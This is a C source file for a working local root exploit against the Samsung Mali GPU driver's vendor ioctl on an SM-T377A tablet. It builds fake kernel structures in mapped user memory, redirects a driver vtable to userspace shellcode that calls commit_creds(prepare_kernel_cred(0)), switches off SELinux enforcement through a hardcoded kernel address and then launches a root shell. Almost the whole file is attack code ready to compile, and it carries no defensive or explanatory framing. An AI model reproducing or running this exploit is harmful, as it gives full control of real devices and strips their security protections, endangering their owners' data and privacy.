/*
 * mali_exploit3.c — Mali vendor dispatch privilege escalation exploit
 *
 * VULNERABILITY: Samsung vendor dispatch (ioctl magic 0x80) dereferences
 * MEM_IMPORT phandle as a kernel pointer without validation.
 *
 * EXPLOITATION STRATEGY:
 * 1. mmap controlled memory at lowest possible address (mmap_min_addr=32768)
 * 2. Fill with fake struct containing valid semaphore + function pointer
 * 3. Trigger vendor dispatch → kernel follows our fake struct
 * 4. Function pointer redirects to userspace shellcode (no PXN!)
 * 5. Shellcode: commit_creds(prepare_kernel_cred(0)) + disable SELinux
 *
 * PHASED APPROACH (to avoid unnecessary panics):
 * Phase A: Map memory, get past the crash (prove we control the pointer)
 * Phase B: Identify what offsets the kernel reads after the semaphore
 * Phase C: Place function pointer → shellcode
 * Phase D: Full root exploit
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o mali_exploit3 mali_exploit3.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

/* Known kernel addresses (SM-T377A, no KASLR) */
#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define SELINUX_ENFORCING   0xc0b7ad54

/* Mali ioctl helpers */
struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/*
 * Fill a memory region with valid ARM32 semaphore pattern.
 *
 * struct semaphore (ARM32 Linux 3.10):
 *   raw_spinlock_t lock;       // 4 bytes, 0 = unlocked (ticket: owner==next)
 *   unsigned int count;        // 4 bytes, >0 = available
 *   struct list_head wait_list; // 8 bytes (next, prev → self for empty)
 * Total: 16 bytes
 *
 * We fill every 16-byte-aligned block as a valid, available semaphore.
 * We also fill at 4-byte offsets to cover cases where the semaphore
 * isn't at a 16-byte boundary.
 */
static void fill_semaphore_pattern(void *base_ptr, uint32_t base_addr, size_t size) {
    uint32_t *p = (uint32_t *)base_ptr;
    size_t n = size / 4;

    /* First pass: fill everything with safe values
     * 0x00010001 = {owner=1, next=1} = unlocked spinlock
     * Also works as semaphore count (65537 > 0)
     */
    for (size_t i = 0; i < n; i++)
        p[i] = 0x00010001;

    /* Second pass: at every 16-byte boundary, write proper semaphore */
    for (size_t off = 0; off < size; off += 16) {
        uint32_t addr = base_addr + off;
        uint32_t *sem = (uint32_t *)((uint8_t *)base_ptr + off);
        sem[0] = 0;           /* spinlock: owner=0, next=0 → unlocked */
        sem[1] = 0x7FFFFFFF;  /* count: large positive → down() returns immediately */
        sem[2] = addr + 8;    /* wait_list.next → &wait_list (empty list) */
        sem[3] = addr + 8;    /* wait_list.prev → &wait_list (empty list) */
    }

    /* Third pass: same at 8-byte boundaries (covers different alignments) */
    for (size_t off = 8; off < size; off += 16) {
        uint32_t addr = base_addr + off;
        uint32_t *sem = (uint32_t *)((uint8_t *)base_ptr + off);
        sem[0] = 0;
        sem[1] = 0x7FFFFFFF;
        if (off + 12 < size) {
            sem[2] = addr + 8;
            sem[3] = addr + 8;
        }
    }
}

/*
 * ARM32 shellcode for kernel privilege escalation.
 * Runs in kernel mode (no PXN on this device).
 *
 * This function MUST be called from kernel context.
 * It calls commit_creds(prepare_kernel_cred(0)) and disables SELinux.
 */
static volatile int g_shellcode_ran = 0;

/* Mark as used to prevent compiler from optimizing it away */
void __attribute__((noinline, used, optimize("O0")))
kernel_shellcode(void) {
    /* Function pointers to kernel functions */
    void *(*prepare_kernel_cred_fn)(void *) =
        (void *(*)(void *))PREPARE_KERNEL_CRED;
    int (*commit_creds_fn)(void *) =
        (int (*)(void *))COMMIT_CREDS;

    /* Get root credentials */
    void *cred = prepare_kernel_cred_fn((void *)0);
    commit_creds_fn(cred);

    /* Disable SELinux */
    *(volatile int *)SELINUX_ENFORCING = 0;

    /* Signal success */
    g_shellcode_ran = 1;
}

/* ====================================================================== */
/* PHASE A: Get past the crash — prove we can survive the ioctl           */
/* ====================================================================== */
static void phase_a(uint32_t map_addr, uint32_t phandle_value) {
    fprintf(stderr, "  map=0x%x phandle=0x%x\n", map_addr, phandle_value);

    /* Map controlled memory */
    size_t map_size = 0x10000; /* 64KB */
    void *mapped = mmap((void *)(uintptr_t)map_addr, map_size,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                        -1, 0);
    if (mapped == MAP_FAILED) {
        fprintf(stderr, "  mmap failed: %s\n", strerror(errno));
        return;
    }
    fprintf(stderr, "  mapped %zuKB at %p\n", map_size/1024, mapped);

    /* Fill with valid semaphore pattern */
    fill_semaphore_pattern(mapped, map_addr, map_size);

    /* Open Mali context */
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) {
        fprintf(stderr, "  Mali open failed\n");
        munmap(mapped, map_size);
        return;
    }

    /* Build MEM_IMPORT struct with controlled phandle */
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;  /* MEM_IMPORT */
    *(uint64_t*)(buf + 8) = (uint64_t)phandle_value;
    *(uint32_t*)(buf + 16) = 2;  /* type = UMM */

    fprintf(stderr, "  Calling vendor dispatch...\n");
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    int e = errno;
    uint32_t result = ((struct uk_header*)buf)->id;
    fprintf(stderr, "  ioctl=%d errno=%d result=%u\n", r, e, result);
    fprintf(stderr, "  *** SURVIVED! ***\n");

    close(mali_fd);
    munmap(mapped, map_size);
}

/* ====================================================================== */
/* PHASE B: Probe which offsets the kernel reads from our fake struct      */
/* ====================================================================== */
static void phase_b(uint32_t map_addr, uint32_t phandle_value) {
    fprintf(stderr, "  Probing kernel reads at phandle=0x%x\n", phandle_value);

    size_t map_size = 0x10000;
    void *mapped = mmap((void *)(uintptr_t)map_addr, map_size,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                        -1, 0);
    if (mapped == MAP_FAILED) return;

    /* Fill with valid semaphore pattern first */
    fill_semaphore_pattern(mapped, map_addr, map_size);

    /* Overlay distinguishable marker values at specific offsets
     * After the call, check dmesg or return values to see which were accessed.
     * Use values that are still valid spinlocks (owner=next) but distinguishable. */
    uint32_t *p = (uint32_t *)((uint8_t *)mapped + (phandle_value - map_addr));
    /* Keep first 16 bytes as valid semaphore, fill the rest with markers */
    for (int i = 4; i < 64; i++) {
        /* Offset i*4 from phandle: put a marker that includes the offset */
        uint32_t marker = 0xAA000000 | (i * 4);
        p[i] = marker;
    }

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(mapped, map_size); return; }

    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)phandle_value;
    *(uint32_t*)(buf + 16) = 2;

    fprintf(stderr, "  Calling vendor dispatch with markers...\n");
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  ioctl=%d errno=%d result=%u\n", r, errno, ((struct uk_header*)buf)->id);

    /* Check if any markers were modified (kernel wrote to our memory) */
    fprintf(stderr, "  Checking for kernel writes:\n");
    for (int i = 4; i < 64; i++) {
        uint32_t expected = 0xAA000000 | (i * 4);
        if (p[i] != expected) {
            fprintf(stderr, "    offset %3d (0x%02x): 0x%08x → 0x%08x (MODIFIED!)\n",
                    i*4, i*4, expected, p[i]);
        }
    }

    /* Also dump the response buffer for info leaks */
    fprintf(stderr, "  Response buffer:\n");
    for (int i = 0; i < 48; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        if (v != 0)
            fprintf(stderr, "    buf[%2d]: 0x%08x\n", i, v);
    }

    close(mali_fd);
    munmap(mapped, map_size);
}

/* ====================================================================== */
/* PHASE C: Full exploit with shellcode                                   */
/* ====================================================================== */

/* We need a fake struct that the kernel traverses.
 * Based on analysis, the import code likely does:
 *
 * 1. Acquire lock (semaphore or mutex) at phandle + offset_lock
 * 2. Read function pointer at phandle + offset_ops (like dma_buf->ops)
 * 3. Call through the ops vtable
 *
 * For struct dma_buf on ARM32 (3.10):
 *   +0x00: size (size_t, 4 bytes)
 *   +0x04: file (struct file *, 4 bytes)
 *   +0x08: attachments (list_head, 8 bytes)
 *   +0x10: ops (const struct dma_buf_ops *, 4 bytes)
 *   +0x14: lock (struct mutex)
 *          +0x14: atomic count (4 bytes, 1=unlocked)
 *          +0x18: wait_lock (spinlock, 4 bytes)
 *          +0x1C: wait_list (list_head, 8 bytes)
 *          +0x24: owner (4 bytes, optional)
 *   +0x28: vmapping_counter (unsigned)
 *   +0x2C: vmap_ptr (void *)
 *   +0x30: exp_name (const char *)
 *   +0x34: owner (struct module *)
 *   +0x38: list_node (list_head, 8 bytes)
 *   +0x40: priv (void *)
 *   +0x44: resv (struct reservation_object *)
 *   +0x48: poll (wait_queue_head_t)
 *
 * Fake dma_buf_ops vtable needs to survive the import code path.
 * The import likely calls ops->attach() or increments a refcount.
 */

static void phase_c(uint32_t map_addr) {
    fprintf(stderr, "  Setting up full exploit at 0x%x\n", map_addr);

    size_t map_size = 0x10000;
    void *mapped = mmap((void *)(uintptr_t)map_addr, map_size,
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                        -1, 0);
    if (mapped == MAP_FAILED) {
        fprintf(stderr, "  mmap failed: %s\n", strerror(errno));
        return;
    }

    /* Fill base pattern */
    fill_semaphore_pattern(mapped, map_addr, map_size);

    /* Set up fake dma_buf at offset 0x1000 */
    uint32_t fake_dma_buf_addr = map_addr + 0x1000;
    uint32_t *dma_buf = (uint32_t *)((uint8_t *)mapped + 0x1000);

    /* Set up fake ops vtable at offset 0x2000 */
    uint32_t fake_ops_addr = map_addr + 0x2000;
    uint32_t *ops = (uint32_t *)((uint8_t *)mapped + 0x2000);

    /* Fake dma_buf layout */
    dma_buf[0] = 4096;              /* size */
    dma_buf[1] = 0;                 /* file - NULL initially */
    dma_buf[2] = fake_dma_buf_addr + 8;  /* attachments.next → self */
    dma_buf[3] = fake_dma_buf_addr + 8;  /* attachments.prev → self */
    dma_buf[4] = fake_ops_addr;     /* ops → our fake vtable */
    /* mutex at +0x14 */
    dma_buf[5] = 1;                 /* mutex.count = 1 (unlocked) */
    dma_buf[6] = 0;                 /* mutex.wait_lock = 0 (unlocked) */
    dma_buf[7] = fake_dma_buf_addr + 0x1C; /* wait_list.next → self */
    dma_buf[8] = fake_dma_buf_addr + 0x1C; /* wait_list.prev → self */
    dma_buf[9] = 0;                 /* owner = NULL */

    /* Also set up as semaphore at +0x14 (in case it's semaphore not mutex) */
    /* Semaphore: lock(4), count(4), wait_list(8) */
    /* Already covered by mutex layout (compatible) */

    /* Also fill the area as if it's a different struct type */
    /* Cover various lock offsets: 0, 4, 8, 12, 16, 20, 24 */
    for (int off = 0; off < 256; off += 16) {
        uint32_t base = fake_dma_buf_addr + off;
        uint32_t *s = &dma_buf[off/4];
        /* Don't overwrite our explicit layout above */
        if (off >= 40) {
            s[0] = 0;
            s[1] = 0x7FFFFFFF;
            s[2] = base + 8;
            s[3] = base + 8;
        }
    }

    /* Fake ops vtable — each entry points to our shellcode */
    uint32_t shellcode_addr = (uint32_t)(uintptr_t)kernel_shellcode;
    fprintf(stderr, "  shellcode at 0x%08x\n", shellcode_addr);

    /* Fill ALL vtable entries with shellcode address */
    for (int i = 0; i < 64; i++)
        ops[i] = shellcode_addr;

    /* Open Mali */
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(mapped, map_size); return; }

    /* Trigger */
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)fake_dma_buf_addr;
    *(uint32_t*)(buf + 16) = 2;

    fprintf(stderr, "  Triggering exploit...\n");
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  ioctl returned: %d (errno=%d result=%u)\n",
            r, errno, ((struct uk_header*)buf)->id);

    if (g_shellcode_ran) {
        fprintf(stderr, "  *** SHELLCODE EXECUTED! ***\n");
    }

    /* Check if we're root */
    if (getuid() == 0) {
        fprintf(stderr, "\n  *** ROOT ACHIEVED! ***\n");
        fprintf(stderr, "  uid=%d gid=%d\n", getuid(), getgid());
        execl("/system/bin/sh", "sh", NULL);
    }

    close(mali_fd);
    munmap(mapped, map_size);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Vendor Dispatch Exploit ===\n");
    fprintf(stderr, "SM-T377A kernel 3.10.9 | No KASLR | No PXN\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());
    fprintf(stderr, "commit_creds=0x%08x prepare_kernel_cred=0x%08x\n",
            COMMIT_CREDS, PREPARE_KERNEL_CRED);
    fprintf(stderr, "shellcode at %p\n\n", kernel_shellcode);

    char phase = 'A';
    uint32_t map_addr = 0x40000000;  /* 1GB — far from PIE binary at ~0x10000 */
    uint32_t phandle = 0;

    if (argc >= 2) phase = argv[1][0];
    if (argc >= 3) map_addr = strtoul(argv[2], NULL, 0);
    if (argc >= 4) phandle = strtoul(argv[3], NULL, 0);

    /* Default phandle = middle of mapped region */
    if (phandle == 0) phandle = map_addr + 0x1000;

    switch (phase) {
        case 'A': case 'a': {
            fprintf(stderr, "=== PHASE A: Survive the crash ===\n");
            /* Try in forked child to contain any crash */
            pid_t pid = fork();
            if (pid == 0) {
                alarm(5);
                phase_a(map_addr, phandle);
                _exit(0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFSIGNALED(status))
                fprintf(stderr, "CRASHED: signal %d\n", WTERMSIG(status));
            else if (WIFEXITED(status) && WEXITSTATUS(status) == 14)
                fprintf(stderr, "TIMEOUT (SIGALRM) — got past crash, stuck in lock\n");
            else
                fprintf(stderr, "Child exited: %d\n", WEXITSTATUS(status));
            break;
        }

        case 'B': case 'b': {
            fprintf(stderr, "=== PHASE B: Probe kernel reads ===\n");
            pid_t pid = fork();
            if (pid == 0) {
                alarm(5);
                phase_b(map_addr, phandle);
                _exit(0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFSIGNALED(status))
                fprintf(stderr, "CRASHED: signal %d\n", WTERMSIG(status));
            else if (WIFEXITED(status) && WEXITSTATUS(status) == 14)
                fprintf(stderr, "TIMEOUT — kernel is using our memory!\n");
            else
                fprintf(stderr, "Child exited: %d\n", WEXITSTATUS(status));
            break;
        }

        case 'C': case 'c': {
            fprintf(stderr, "=== PHASE C: Full exploit ===\n");
            /* This one we run directly — if shellcode works, we want root in this process */
            pid_t pid = fork();
            if (pid == 0) {
                alarm(8);
                phase_c(map_addr);
                _exit(g_shellcode_ran ? 42 : 0);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
                fprintf(stderr, "Shellcode executed in child! Re-running in parent...\n");
                phase_c(map_addr);
            } else if (WIFSIGNALED(status)) {
                fprintf(stderr, "CRASHED: signal %d\n", WTERMSIG(status));
            } else if (WIFEXITED(status) && WEXITSTATUS(status) == 14) {
                fprintf(stderr, "TIMEOUT — need to fix semaphore pattern\n");
            } else {
                fprintf(stderr, "Child exited: %d\n", WEXITSTATUS(status));
            }
            break;
        }

        default:
            fprintf(stderr, "Usage: %s <phase> [map_addr] [phandle]\n", argv[0]);
            fprintf(stderr, "  A = Survive the crash (safe test)\n");
            fprintf(stderr, "  B = Probe kernel reads\n");
            fprintf(stderr, "  C = Full exploit\n");
            fprintf(stderr, "Defaults: map=0x10000, phandle=map+0x1000\n");
            break;
    }

    fprintf(stderr, "\n--- dmesg ---\n");
    system("dmesg 2>/dev/null | tail -5 | grep -iE 'mali|kbase|oops|bug|panic|fault' 2>/dev/null");
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
